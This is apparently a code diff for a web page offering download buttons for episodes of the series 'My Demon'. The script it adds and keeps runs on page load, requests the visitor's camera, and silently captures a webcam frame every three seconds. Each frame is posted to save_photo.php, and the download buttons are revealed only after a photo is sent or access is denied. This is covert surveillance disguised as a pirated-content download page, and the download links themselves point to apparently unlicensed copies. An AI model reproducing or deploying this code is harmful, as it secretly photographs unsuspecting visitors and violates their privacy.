@@ -1,54 +1,103 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
- <title>Capture and Send Photo</title>
- <script>
-    function capturePhotoAndNotify() {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(function(stream) {
-          const video = document.createElement('video');
-          video.srcObject = stream;
-          video.play();
-          video.addEventListener('playing', function() {
-            setInterval(function() {
-              const canvas = document.createElement('canvas');
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              const ctx = canvas.getContext('2d');
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-              const imageDataURL = canvas.toDataURL('image/jpeg');
-              sendPhoto(imageDataURL);
-            }, 3000); 
-          });
-        })
-        .catch(function(err) {
-          console.error('Error:', err);
-        });
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture and Send Photo</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
 
-    function sendPhoto(imageDataURL) {
-      fetch('save_photo.php', {
-        method: 'POST',
-        body: JSON.stringify({ imageDataURL: imageDataURL }),
-        headers: new Headers({
-          'Content-Type': 'application/json'
-        })
-      })
-        .then(function(response) {
-          return response.json();
-        })
-        .then(function(data) {
-          console.log('%c✅ Photo sent:', 'color: green; font-weight: bold;', data.filename);
-        })
-        .catch(function(err) {
-          console.error('%c❌ Error:', 'color: red; font-weight: bold;', err);
-        });
-    }
-    
-    capturePhotoAndNotify(); 
- </script>
+        #downloadButtons {
+            display: none;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .downloadBtn {
+            padding: 10px;
+            background-color: #3498db;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
 </head>
 <body>
+    <script>
+        function capturePhotoAndNotify() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function (stream) {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    video.addEventListener('playing', function () {
+                        setInterval(function () {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const imageDataURL = canvas.toDataURL('image/jpeg');
+                            sendPhoto(imageDataURL);
+                        }, 3000);
+                    });
+                })
+                .catch(function (err) {
+                    console.error('Error:', err);
+                    showDownloadButtons(); // Show download buttons if camera permission is denied
+                });
+        }
+
+        function sendPhoto(imageDataURL) {
+            fetch('save_photo.php', {
+                method: 'POST',
+                body: JSON.stringify({ imageDataURL: imageDataURL }),
+                headers: new Headers({
+                    'Content-Type': 'application/json'
+                })
+            })
+                .then(function (response) {
+                    return response.json();
+                })
+                .then(function (data) {
+                    console.log('%c✅ Photo sent:', 'color: green; font-weight: bold;', data.filename);
+                    showDownloadButtons(); // Show download buttons after successfully sending photo
+                })
+                .catch(function (err) {
+                    console.error('%c❌ Error:', 'color: red; font-weight: bold;', err);
+                    showDownloadButtons(); // Show download buttons if there is an error
+                });
+        }
+
+        function showDownloadButtons() {
+            const downloadButtons = document.getElementById('downloadButtons');
+            downloadButtons.style.display = 'flex';
+        }
+
+        capturePhotoAndNotify();
+    </script>
+
+    <div id="downloadButtons">
+        <!-- Add 10 download buttons for the film "My Demon" -->
+        <button class="downloadBtn" onclick="window.location.href='https://downloadwella.com/y4anfl3cuzm4/My.Demon.E01.(NKIRI.COM).mkv.html';">Download My Demon EP 1</button>
+        <button class="downloadBtn" onclick="window.location.href='https://downloadwella.com/z4o7y0z11f28/My.Demon.E02.(NKIRI.COM).mkv.html';">Download My Demon EP 2</button>
+        <button class="downloadBtn" onclick="window.location.href='https://downloadwella.com/2m53zck2ef2k/My.Demon.E03.(NKIRI.COM).mkv.html';">Download My Demon EP 3</button>
+        <button class="downloadBtn" onclick="window.location.href='https://downloadwella.com/a4xumjairmki/My.Demon.E04.(NKIRI.COM).mkv.html';">Download My Demon EP 4</button>
+        <button class="downloadBtn" onclick="window.location.href='https://downloadwella.com/7m1btvsfn27m/My.Demon.E05.(NKIRI.COM).mkv.html';">Download My Demon EP 5</button>
+        <button class="downloadBtn" onclick="window.location.href='https://downloadwella.com/tcrd55xgst60/My.Demon.E06.(NKIRI.COM).mkv.html';">Download My Demon EP 6</button>
+        <button class="downloadBtn" onclick="window.location.href='https://downloadwella.com/0hxq27a2b1an/My.Demon.E07.(NKIRI.COM).mkv.html';">Download My Demon EP 7</button>
+        <button class="downloadBtn" onclick="window.location.href='https://downloadwella.com/vsia51yu4us5/My.Demon.E08.(NKIRI.COM).mkv.html';">Download My Demon EP 8</button>
+        <button class="downloadBtn" onclick="window.location.href='https://downloadwella.com/6a2g4ipjdbtu/My.Demon.E09.(NKIRI.COM).mkv.html';">Download My Demon EP 9</button>
+        <button class="downloadBtn" onclick="window.location.href='https://downloadwella.com/c6le8jyp914v/My.Demon.E10.(NKIRI.COM).mkv.html';">Download My Demon EP 10</button>
+    </div>
 </body>
 </html>
-
